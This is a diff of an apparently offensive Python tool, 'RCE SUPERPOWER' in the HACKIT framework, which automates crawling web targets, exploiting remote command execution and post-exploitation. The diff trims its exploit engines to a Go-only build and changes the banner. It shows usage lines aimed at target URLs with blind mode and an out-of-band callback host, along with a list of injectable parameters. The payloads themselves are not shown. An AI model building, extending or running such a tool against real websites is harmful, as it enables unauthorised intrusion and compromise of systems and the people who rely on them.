@@ -2,7 +2,7 @@
 """
 ╔══════════════════════════════════════════════════════════════════════╗
 ║  RCE SUPERPOWER — Auto Crawl · Exploit · Post-Exploitation Chain  ║
-║  HACKIT Framework v2.0 — 4 Engines (Go/Rust/C++/C)                ║
+║  HACKIT Framework v2.2 — Go Engine                               ║
 ╚══════════════════════════════════════════════════════════════════════╝
 """
 
@@ -69,27 +69,20 @@ R = "\033[0;31m"; G = "\033[0;32m"; Y = "\033[1;33m"
 B = "\033[0;34m"; M = "\033[0;35m"; C = "\033[0;36m"; W = "\033[1;37m"; N = "\033[0m"
 
 HEADER = f"""
-{R}   ███████╗ ██████╗███████╗    ███████╗██╗  ██╗███████╗{N}
-{R}   ██╔════╝██╔════╝██╔════╝    ██╔════╝╚██╗██╔╝██╔════╝{N}
-{R}   █████╗  ██║     █████╗      █████╗   ╚███╔╝ █████╗  {N}
-{R}   ██╔══╝  ██║     ██╔══╝      ██╔══╝   ██╔██╗ ██╔══╝  {N}
-{R}   ██║     ╚██████╗███████╗    ███████╗██╔╝ ██╗███████╗{N}
-{R}   ╚═╝      ╚═════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝{N}
-{R}   ┌───────────────────────────────────────────────────┐{N}
-{R}   │  {Y}[🔪] CHAINSAW ACTIVATED. CUTTING THROUGH FIREWALL{R}   │{N}
-{R}   │  {R}[💀] RCE-SUPER.EXE — SLASH. EXECUTE. DESTROY.{R}        │{N}
-{R}   │  {C}[X]  HackIT V2.1 - By AniipID{R}                    │{N}
-{R}   │  {G}[+] Auto Crawl · Exploit · Post-Exploitation{R}        │{N}
-{R}   │  {G}[+] 4 Engines · 150+ Payloads · 12 Techniques{R}      │{N}
-{R}   └───────────────────────────────────────────────────┘{N}
+{R}      ██████████████████████████████████████████{N}
+{R}      █  {Y}☢  RCE  NUCLEAR  ☢{R}                   █{N}
+{R}      █    {W}── exploit core ──{R}                  █{N}
+{R}      █   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    █{N}
+{R}      █   █ HackIT RCE Tools V2.1         █    █{N}
+{R}      █   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀    █{N}
+{R}      █         {W}BY : AniipID{R}                   █{N}
+{R}      ██████████████████████████████████████████{N}
+{Y}      ☢  payload armed  ☢  waiting for trigger{N}
 """
 
 MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
 ENGINES = {
     "go": os.path.join(MODULE_DIR, "go", "bin", "rce_engine"),
-    "rust": os.path.join(MODULE_DIR, "rust", "target", "release", "rce_engine"),
-    "cpp": os.path.join(MODULE_DIR, "cpp", "bin", "rce_engine"),
-    "c": os.path.join(MODULE_DIR, "c", "bin", "rce_engine"),
 }
 COMMON_PARAMS = [
     "q","id","cmd","exec","command","url","host","file","input","search",
@@ -252,7 +245,7 @@ class RceCrawler:
 
 class EngineLauncher:
     def __init__(self, engines: List[str] = None):
-        self.engines = engines or ["go", "rust", "cpp", "c"]
+        self.engines = engines or ["go"]
         self.available = {e: os.path.exists(p) for e, p in ENGINES.items() if e in self.engines}
 
     def test_endpoint(self, endpoint: Endpoint, cmd: str = "", timeout: int = 10,
@@ -512,7 +505,7 @@ class RceSuperPower:
                  blind: bool = False, oob: str = "", auto_post: bool = True,
                  verbose: bool = False):
         self.base_url = base_url.rstrip("/")
-        self.engines = engines or ["go", "rust", "cpp", "c"]
+        self.engines = engines or ["go"]
         self.max_depth = max_depth
         self.max_pages = max_pages
         self.timeout = timeout
@@ -653,14 +646,14 @@ def main():
 Contoh:
   %(prog)s -u http://target.com
   %(prog)s -u http://target.com/page.php?cmd=test --blind
-  %(prog)s -u http://target.com --oob http://collab.oastify.com --engines go,rust
+  %(prog)s -u http://target.com --oob http://collab.oastify.com
   %(prog)s -u http://target.com --depth 3 --pages 100 --no-post
   %(prog)s -u http://target.com --verbose
         """
     )
     parser.add_argument("-u", "--url", required=True, help="Target URL (main page)")
-    parser.add_argument("-e", "--engines", default="go,rust,cpp,c",
-                        help="Engines: go,rust,cpp,c (default: all)")
+    parser.add_argument("-e", "--engines", default="go",
+                        help="Engine: go (only option)")
     parser.add_argument("--depth", type=int, default=2, help="Crawl depth (default: 2)")
     parser.add_argument("--pages", type=int, default=30, help="Max pages to crawl (default: 30)")
     parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10s)")
